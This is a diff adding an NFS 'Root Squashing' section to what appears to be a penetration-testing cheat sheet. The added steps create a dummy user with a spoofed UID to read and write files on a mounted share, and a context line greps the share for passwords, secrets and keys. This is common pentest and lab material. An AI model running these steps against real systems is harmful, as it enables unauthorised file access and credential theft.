@@ -54,3 +54,27 @@ grep -r "password\|secret\|key" /mnt/nfs
 ls -la /mnt/nfs
 ```
 
+### Root Squashing
+
+#### After mounting, list directories to find GUID or UID of the owner of files/directories
+```
+ls -la
+ls -ld
+```
+
+#### Then if root squashing is possible we can attempt to create a dummy user and set their UID/GUID to what the files have, since the NFS server may give us access as long we have the right UID
+```
+sudo useradd dummy
+sudo usermod -u <UID_WE_WANT_TO_SET_FOR_USER> dummy
+```
+
+#### Use `su` to change to that user and launch a bash shell as that user
+```
+sudo su dummy -c bash
+```
+#### Test if we can access/write files
+```
+ls -la 
+cat <file>
+echo "Test?" > /mnt/0xdf.html
+```
